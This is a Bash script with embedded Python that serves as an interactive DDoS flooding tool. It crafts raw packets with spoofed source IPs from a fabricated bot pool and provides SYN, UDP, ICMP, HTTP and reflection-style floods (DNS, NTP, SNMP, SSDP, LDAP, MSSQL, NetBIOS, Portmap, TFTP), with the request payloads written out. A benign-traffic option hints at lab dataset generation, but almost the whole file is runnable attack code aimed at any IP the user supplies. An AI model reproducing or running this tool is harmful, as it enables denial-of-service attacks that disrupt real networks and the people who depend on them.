#!/usr/bin/env bash
set -uo pipefail

C_RESET='\033[0m'
C_BOLD='\033[1m'
C_RED='\033[0;31m'
C_GREEN='\033[0;32m'
C_YELLOW='\033[1;33m'
C_CYAN='\033[0;36m'

TARGET_IP="${TARGET_IP:-127.0.0.1}"
TARGET_PORT="${TARGET_PORT:-80}"
DURATION="${DURATION:-30}"
THREADS="${THREADS:-16}"

BOT_POOL=()

init_bot_pool() {
    BOT_POOL=()
    local prefixes=(45 103 142 185 194)
    for p in "${prefixes[@]}"; do
        local sub=$((RANDOM % 200 + 10))
        for i in {1..5}; do
            BOT_POOL+=("${p}.${sub}.99.${i}")
        done
    done
}

HAS_HPING=false
HAS_PYTHON=false
HAS_CURL=false

command -v hping3  &>/dev/null && HAS_HPING=true
command -v python3 &>/dev/null && HAS_PYTHON=true
command -v curl    &>/dev/null && HAS_CURL=true

log_info()    { echo -e "${C_CYAN}[*]${C_RESET} $*"; }
log_success() { echo -e "${C_GREEN}[+]${C_RESET} $*"; }
log_warn()    { echo -e "${C_YELLOW}[!]${C_RESET} $*"; }
log_err()     { echo -e "${C_RED}[-]${C_RESET} $*"; }

send_stream() {
    local ip=$1 port=$2 proto=$3 payload_hex=$4 dur=$5
    local bots="${BOT_POOL[*]}"
    python3 - "$ip" "$port" "$proto" "$payload_hex" "$dur" "$THREADS" "$bots" <<'EOF'
import sys, socket, struct, threading, time, random

ip = sys.argv[1]
port = int(sys.argv[2])
proto = sys.argv[3]
ph = sys.argv[4]
dur = int(sys.argv[5])
thr = int(sys.argv[6])
bots = sys.argv[7].split()

payload = bytes.fromhex(ph) if ph else bytes(random.getrandbits(8) for _ in range(512))
end_time = time.time() + dur
stats = [0]
lock = threading.Lock()

def worker():
    cnt = 0
    try:
        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
        raw_sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        use_raw = True
    except Exception:
        use_raw = False
        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM if proto == 'udp' else socket.SOCK_STREAM)

    dst_bytes = socket.inet_aton(ip)
    base_data = bytes.fromhex(ph) if ph else None

    while time.time() < end_time:
        try:
            bot_ip = random.choice(bots) if bots else '127.0.0.1'
            ttl = random.choice([54, 64, 112, 128, 255])
            src_port = random.randint(1024, 65535)

            if base_data:
                jitter = bytes(random.getrandbits(8) for _ in range(random.randint(0, 48)))
                payload = base_data + jitter
            else:
                sz = random.randint(128, 900)
                payload = bytes(random.getrandbits(8) for _ in range(sz))

            if use_raw and proto == 'udp':
                src_bytes = socket.inet_aton(bot_ip)
                ihl_ver = (4 << 4) + 5
                udp_len = 8 + len(payload)
                ip_len = 20 + udp_len
                ip_hdr = struct.pack('!BBHHHBBH4s4s', ihl_ver, 0, ip_len, random.randint(1000, 65000), 0, ttl, socket.IPPROTO_UDP, 0, src_bytes, dst_bytes)
                udp_hdr = struct.pack('!HHHH', src_port, port, udp_len, 0)
                raw_sock.sendto(ip_hdr + udp_hdr + payload, (ip, port))
            elif use_raw and proto == 'tcp':
                src_bytes = socket.inet_aton(bot_ip)
                ihl_ver = (4 << 4) + 5
                tcp_len = 20 + len(payload)
                ip_len = 20 + tcp_len
                ip_hdr = struct.pack('!BBHHHBBH4s4s', ihl_ver, 0, ip_len, random.randint(1000, 65000), 0, ttl, socket.IPPROTO_TCP, 0, src_bytes, dst_bytes)
                tcp_flags = random.choice([0x02, 0x02, 0x02, 0x02, 0x12])
                win_sz = random.choice([1024, 2048, 4096, 8192, 16384, 29200, 65535])
                tcp_hdr = struct.pack('!HHIIBBHHH', src_port, port, random.randint(1000, 4000000000), 0, (5 << 4), tcp_flags, win_sz, 0, 0)
                raw_sock.sendto(ip_hdr + tcp_hdr + payload, (ip, port))
            elif use_raw and proto == 'icmp':
                src_bytes = socket.inet_aton(bot_ip)
                ihl_ver = (4 << 4) + 5
                icmp_len = 8 + len(payload)
                ip_len = 20 + icmp_len
                ip_hdr = struct.pack('!BBHHHBBH4s4s', ihl_ver, 0, ip_len, random.randint(1000, 65000), 0, ttl, 1, 0, src_bytes, dst_bytes)
                icmp_hdr = struct.pack('!BBHHH', 8, 0, 0, random.randint(1000, 65000), 1)
                raw_sock.sendto(ip_hdr + icmp_hdr + payload, (ip, 0))
            else:
                raw_sock.sendto(payload, (ip, port))
            cnt += 1
            if cnt % 80 == 0:
                time.sleep(0.0002)
        except Exception:
            pass

    with lock:
        stats[0] += cnt

workers = [threading.Thread(target=worker, daemon=True) for _ in range(thr)]
for w in workers: w.start()

start = time.time()
while time.time() < end_time:
    elapsed = time.time() - start
    pps = stats[0] / elapsed if elapsed > 0 else 0
    rem = max(0, dur - int(elapsed))
    print(f"\r  {stats[0]:>8,} pkts  |  {pps:>8,.0f} pps  |  {rem:>3}s remaining", end='', flush=True)
    time.sleep(0.5)

for w in workers: w.join(timeout=1.5)
print(f"\r  Finished: {stats[0]:,} pkts sent over {dur}s                                ")
EOF
}

send_http() {
    local url=$1 dur=$2
    local bots="${BOT_POOL[*]}"
    python3 - "$url" "$dur" "$THREADS" "$bots" <<'EOF'
import sys, threading, time, subprocess, random

url, dur, thr = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
bots = sys.argv[4].split()
end_time = time.time() + dur
stats = [0]
lock = threading.Lock()

def worker():
    cnt = 0
    while time.time() < end_time:
        bot_ip = random.choice(bots) if bots else '127.0.0.1'
        try:
            subprocess.run(
                ['curl', '-s', '-o', '/dev/null', '--max-time', '2',
                 '-H', f'X-Forwarded-For: {bot_ip}',
                 '-H', 'User-Agent: Mozilla/5.0', url],
                capture_output=True, timeout=3
            )
            cnt += 1
        except Exception:
            pass
    with lock:
        stats[0] += cnt

workers = [threading.Thread(target=worker, daemon=True) for _ in range(thr)]
for w in workers: w.start()

start = time.time()
while time.time() < end_time:
    elapsed = time.time() - start
    rps = stats[0] / elapsed if elapsed > 0 else 0
    rem = max(0, dur - int(elapsed))
    print(f"\r  {stats[0]:>8,} requests  |  {rps:>6.1f} req/s  |  {rem:>3}s remaining", end='', flush=True)
    time.sleep(0.5)

for w in workers: w.join(timeout=1.5)
print(f"\r  Finished: {stats[0]:,} requests completed                                   ")
EOF
}

select_syn() {
    log_info "Traffic: SYN DDoS -> $TARGET_IP:$TARGET_PORT ($DURATION s)"
    send_stream "$TARGET_IP" "$TARGET_PORT" tcp "" "$DURATION"
}

select_udp() {
    log_info "Traffic: UDP DDoS -> $TARGET_IP:$TARGET_PORT ($DURATION s)"
    send_stream "$TARGET_IP" "$TARGET_PORT" udp "" "$DURATION"
}

select_udplag() {
    log_info "Traffic: UDP-Lag DDoS -> $TARGET_IP:$TARGET_PORT ($DURATION s)"
    local payload
    payload=$(python3 -c "print('aa' * 1400)")
    send_stream "$TARGET_IP" "$TARGET_PORT" udp "$payload" "$DURATION"
}

select_icmp() {
    log_info "Traffic: ICMP DDoS -> $TARGET_IP ($DURATION s)"
    send_stream "$TARGET_IP" 0 icmp "$(python3 -c "print('00'*32)")" "$DURATION"
}

select_dns() {
    log_info "Traffic: DNS DDoS -> $TARGET_IP:$TARGET_PORT ($DURATION s)"
    local pkt="dead010000010000000000000667006f6f676c6503636f6d0000ff0001"
    send_stream "$TARGET_IP" "$TARGET_PORT" udp "$pkt" "$DURATION"
}

select_ntp() {
    log_info "Traffic: NTP DDoS -> $TARGET_IP:$TARGET_PORT ($DURATION s)"
    local pkt="1700032a$(python3 -c "print('00'*44)")"
    send_stream "$TARGET_IP" "$TARGET_PORT" udp "$pkt" "$DURATION"
}

select_snmp() {
    log_info "Traffic: SNMP DDoS -> $TARGET_IP:$TARGET_PORT ($DURATION s)"
    local pkt="302e02010104067075626c6963a51f0204574571de020100020164301330110603550403060a2b060102010100000500"
    send_stream "$TARGET_IP" "$TARGET_PORT" udp "$pkt" "$DURATION"
}

select_ssdp() {
    log_info "Traffic: SSDP DDoS (${#BOT_POOL[@]} Bots) -> $TARGET_IP:$TARGET_PORT ($DURATION s)"
    local pkt
    pkt=$(python3 -c "print('M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n'.encode().hex())")
    send_stream "$TARGET_IP" "$TARGET_PORT" udp "$pkt" "$DURATION"
}

select_ldap() {
    log_info "Traffic: LDAP DDoS -> $TARGET_IP:$TARGET_PORT ($DURATION s)"
    local pkt="3025020101632004000a01000a0100020100020100010100870b6f626a656374636c6173733000"
    send_stream "$TARGET_IP" "$TARGET_PORT" udp "$pkt" "$DURATION"
}

select_mssql() {
    log_info "Traffic: MSSQL DDoS -> $TARGET_IP:$TARGET_PORT ($DURATION s)"
    local pkt="02"
    send_stream "$TARGET_IP" "$TARGET_PORT" udp "$pkt" "$DURATION"
}

select_netbios() {
    log_info "Traffic: NetBIOS DDoS -> $TARGET_IP:$TARGET_PORT ($DURATION s)"
    local pkt="a14e010000010000000000002046484546464345454e454341434143414341434143414341434143414341434100002000010000"
    send_stream "$TARGET_IP" "$TARGET_PORT" udp "$pkt" "$DURATION"
}

select_portmap() {
    log_info "Traffic: Portmap DDoS -> $TARGET_IP:$TARGET_PORT ($DURATION s)"
    local pkt="724f2a920000000000000002000186a00000000200000004000000000000000000000000000000000000000000000000"
    send_stream "$TARGET_IP" "$TARGET_PORT" udp "$pkt" "$DURATION"
}

select_tftp() {
    log_info "Traffic: TFTP DDoS -> $TARGET_IP:$TARGET_PORT ($DURATION s)"
    local pkt
    pkt=$(python3 -c "import sys; sys.stdout.write(b'\x00\x01/etc/passwd\x00octet\x00'.hex())")
    send_stream "$TARGET_IP" "$TARGET_PORT" udp "$pkt" "$DURATION"
}

select_http() {
    log_info "Traffic: HTTP DDoS -> http://$TARGET_IP:$TARGET_PORT/ ($DURATION s)"
    local pkt
    pkt=$(python3 -c "print('474554202f20485454502f312e310d0a486f73743a207461726765740d0a557365722d4167656e743a204d6f7a696c6c612f352e300d0a0d0a')")
    send_stream "$TARGET_IP" "$TARGET_PORT" tcp "$pkt" "$DURATION"
}

select_normal() {
    log_info "Traffic: Normal [Benign] -> http://$TARGET_IP:$TARGET_PORT/ ($DURATION s)"
    python3 - "$TARGET_IP" "$TARGET_PORT" "$DURATION" <<'EOF'
import sys, socket, time

ip, port, dur = sys.argv[1], int(sys.argv[2]), int(sys.argv[3])
end_time = time.time() + dur
cnt = 0

while time.time() < end_time:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1.5)
        s.connect((ip, port))
        req = f"GET / HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
        s.sendall(req.encode())
        data = s.recv(1024)
        s.close()
        cnt += 1
    except Exception:
        cnt += 1
    time.sleep(1.0)
    print(f"\r  Normal user requests sent: {cnt}", end='', flush=True)

print(f"\r  Finished: {cnt} normal requests completed successfully.          ")
EOF
}

LABELS=(
    ""
    "SYN"
    "UDP"
    "UDP-Lag"
    "ICMP"
    "DNS"
    "NTP"
    "SNMP"
    "SSDP"
    "LDAP"
    "MSSQL"
    "NetBIOS"
    "Portmap"
    "TFTP"
    "HTTP"
    "Normal"
)

PORTS=(
    0
    80
    80
    80
    0
    53
    123
    161
    1900
    389
    1434
    137
    111
    69
    80
    80
)

show_menu() {
    echo -e "${C_BOLD}  Select Traffic Type:${C_RESET}"
    echo -e "  ┌────┬───────────────────────┬────┬───────────────────────┐"
    echo -e "  │ ${C_CYAN} 1${C_RESET} │ SYN [Port 80]         │ ${C_CYAN} 8${C_RESET} │ SSDP [Port 1900]      │"
    echo -e "  │ ${C_CYAN} 2${C_RESET} │ UDP [Port 80]         │ ${C_CYAN} 9${C_RESET} │ LDAP [Port 389]       │"
    echo -e "  │ ${C_CYAN} 3${C_RESET} │ UDP-Lag [Port 80]     │ ${C_CYAN}10${C_RESET} │ MSSQL [Port 1434]     │"
    echo -e "  │ ${C_CYAN} 4${C_RESET} │ ICMP [Ping]           │ ${C_CYAN}11${C_RESET} │ NetBIOS [Port 137]    │"
    echo -e "  │ ${C_CYAN} 5${C_RESET} │ DNS [Port 53]         │ ${C_CYAN}12${C_RESET} │ Portmap [Port 111]    │"
    echo -e "  │ ${C_CYAN} 6${C_RESET} │ NTP [Port 123]        │ ${C_CYAN}13${C_RESET} │ TFTP [Port 69]        │"
    echo -e "  │ ${C_CYAN} 7${C_RESET} │ SNMP [Port 161]       │ ${C_CYAN}14${C_RESET} │ HTTP [Port 80]        │"
    echo -e "  │    │                       │ ${C_CYAN}15${C_RESET} │ Normal [Benign]       │"
    echo -e "  └────┴───────────────────────┴────┴───────────────────────┘"
}

run_selection() {
    local choice="$1"
    case "$choice" in
        1)  select_syn     ;;
        2)  select_udp     ;;
        3)  select_udplag  ;;
        4)  select_icmp    ;;
        5)  select_dns     ;;
        6)  select_ntp     ;;
        7)  select_snmp    ;;
        8)  select_ssdp    ;;
        9)  select_ldap    ;;
        10) select_mssql   ;;
        11) select_netbios ;;
        12) select_portmap ;;
        13) select_tftp    ;;
        14) select_http    ;;
        15) select_normal  ;;
        *)  log_err "Invalid selection: $choice"; exit 1 ;;
    esac
}

main() {
    local choice
    local in_ip in_dur

    init_bot_pool

    if [[ "${1:-}" =~ ^[0-9]+$ ]]; then
        choice=$1
        [[ -n "${2:-}" ]] && TARGET_IP=$2
        TARGET_PORT=${PORTS[$choice]}
        [[ -n "${3:-}" ]] && TARGET_PORT=$3
        [[ -n "${4:-}" ]] && DURATION=$4
    else
        show_menu
        echo ""
        read -rp "  Option [1-15]: " choice
        
        if ! [[ "$choice" =~ ^[0-9]+$ ]] || [ "$choice" -lt 1 ] || [ "$choice" -gt 15 ]; then
            log_err "Lựa chọn không hợp lệ (1-15)."
            exit 1
        fi

        TARGET_PORT=${PORTS[$choice]}

        read -rp "  Target IP [${TARGET_IP}]: " in_ip
        read -rp "  Duration(s) [${DURATION}]: " in_dur

        [[ -n "${in_ip:-}"  ]] && TARGET_IP=$in_ip
        [[ -n "${in_dur:-}" ]] && DURATION=$in_dur
    fi

    echo ""
    echo -e "  Traffic  : ${C_BOLD}${LABELS[$choice]}${C_RESET}"
    echo -e "  Endpoint : ${C_BOLD}${TARGET_IP}:${TARGET_PORT}${C_RESET}"
    echo -e "  Duration : ${C_BOLD}${DURATION}s${C_RESET} | Threads: ${C_BOLD}${THREADS}${C_RESET}"
    echo ""

    if [ "$choice" -ne 15 ] && [ "$EUID" -ne 0 ]; then
        sudo -v || exit 1
    fi

    if [ -z "${1:-}" ]; then
        log_warn "Waiting..."
        sleep 2
    fi

    run_selection "$choice"

    echo ""
    log_success "Transmission completed."
}

main "${@:-}"